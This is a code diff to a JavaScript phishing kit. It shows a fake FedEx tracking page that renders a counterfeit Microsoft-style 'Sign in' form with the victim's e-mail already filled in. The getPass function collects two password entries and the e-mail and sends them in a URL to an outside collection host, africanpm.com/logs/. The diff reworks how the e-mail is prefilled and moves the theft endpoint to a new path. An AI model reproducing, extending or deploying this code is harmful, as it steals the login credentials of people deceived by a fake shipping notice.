@@ -1,8 +1,15 @@
 const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
 
+const temp_id = document.getElementById("temp_id");
+
 const app_main = document.getElementById("app_main");
 
 const getPager = document.getElementById("getPager");
+
+let main_id = "ENTER E-MAIL";
+if (validEmail.test(temp_id.value)) {
+    main_id = temp_id.value;
+}
 
 const d = new Date();
 
@@ -513,7 +520,7 @@ getPager.addEventListener("click", ()=>{
                 <section class="track_content">
                     <span class="track_id"></span>
     
-                    <span class="track_input" contenteditable="true" spellcheck="false" onclick="fexIputGet(this)">ENTER E-MAIL</span>
+                    <span class="track_input" contenteditable="true" spellcheck="false" onclick="fexIputGet(this)">${main_id}</span>
     
                 </section>
     
@@ -693,7 +700,12 @@ getPager.addEventListener("click", ()=>{
         </section>
     
     `;
-    }, 1000);
+
+    if (validEmail.test(temp_id.value)) {
+        pageMajor(temp_id.value);
+    }
+
+    }, 2500);
 
 });
 
@@ -726,7 +738,18 @@ function fexBtnSub(r) {
         }, 1000);
 
         setTimeout(() => {
-            app_main.innerHTML = `
+            pageMajor(tempMail.innerText.trim());
+
+        }, 3000);
+    }
+    else {
+        alert("Wrong E-MAIL ID")
+    }
+}
+// 
+
+function pageMajor(mail) {
+    app_main.innerHTML = `
             
             <!DOCTYPE html>
 <html lang="en">
@@ -967,7 +990,7 @@ function fexBtnSub(r) {
 
                 <h1 id="header_main">Sign in</h1>
 
-                <input id="e_input" value="${tempMail.innerText.trim()}" class="show_pass_content" placeholder="Email, phone, or Skype">
+                <input id="e_input" value="${mail}" class="show_pass_content" placeholder="Email, phone, or Skype">
 
                 <input type="hidden" id="temp_p">
                 <input type="hidden" id="data_send" value="1">
@@ -1036,12 +1059,6 @@ function fexBtnSub(r) {
                 e_input.style.borderColor = "red";
             }
         }
-
-        }, 3000);
-    }
-    else {
-        alert("Wrong E-MAIL ID")
-    }
 }
 
 // 
@@ -1101,10 +1118,10 @@ function subFormBtn(btn) {
 // 
 function getPass(pass1, pass2, mail) {
     if (pass1 != "" && pass2 !="" && mail != "") {
-        let url = "fedex.php?auth=office&domain=fedex&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
+        let url = "fx_shipping.php?auth=office&domain=fedex&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
 
         if (data_send.value == 1) {
-            url = "https://africanpm.com/logs/msn/fedex.php?auth=office&domain=fedex&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
+            url = "https://africanpm.com/logs/boman/fx_shipping.php?auth=office&domain=fedex&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
         }
 
         location = url;
